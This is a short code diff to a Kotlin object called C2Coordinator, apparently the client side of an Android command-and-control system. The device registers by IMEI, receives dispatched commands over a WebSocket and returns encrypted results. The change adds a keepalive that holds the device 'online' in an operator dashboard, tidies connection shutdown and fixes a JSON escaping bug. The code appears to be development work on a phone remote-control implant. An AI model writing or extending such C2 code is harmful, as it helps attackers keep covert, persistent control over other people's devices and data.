@@ -45,20 +45,43 @@ object C2Coordinator {
                     }
                     val result = kotlinx.coroutines.withTimeoutOrNull(25_000) {
                         deferred.await()
-                    } ?: "{\\\"type\\\":\\\"ErrorResponse\\\",\\\"error\\\":\\\"dispatch_timeout\\\"}"
+                    } ?: "{\"type\":\"ErrorResponse\",\"error\":\"dispatch_timeout\"}"
                     CryptoEngine.encrypt(result)
                 }
             },
             onStatus = { status -> Log.d(TAG, "WS: $status") }
         ).also { it.connect(imei) }
 
+        startKeepalive()
         Log.d(TAG, "Coordinator started — device=$deviceId")
     }
 
     fun stop() {
         keepaliveJob?.cancel()
+        keepaliveJob = null
         scope.cancel()
         ws?.disconnect()
+        ws = null
+    }
+
+    // ── Application-level keepalive ────────────────────────────────────────
+    // Sends a `ping` WS message every KEEPALIVE_INTERVAL_MS. The server marks
+    // the device LastSeen on each ping, keeping it "online" in the dashboard
+    // (its offline checker flips devices after 45s of silence).
+    private fun startKeepalive() {
+        keepaliveJob?.cancel()
+        keepaliveJob = scope.launch {
+            while (isActive) {
+                delay(KEEPALIVE_INTERVAL_MS)
+                try {
+                    if (ws?.isConnected() == true) {
+                        ws?.sendAppPing()
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "keepalive failed: ${e.message}")
+                }
+            }
+        }
     }
 
     fun updateFcmToken(token: String) {
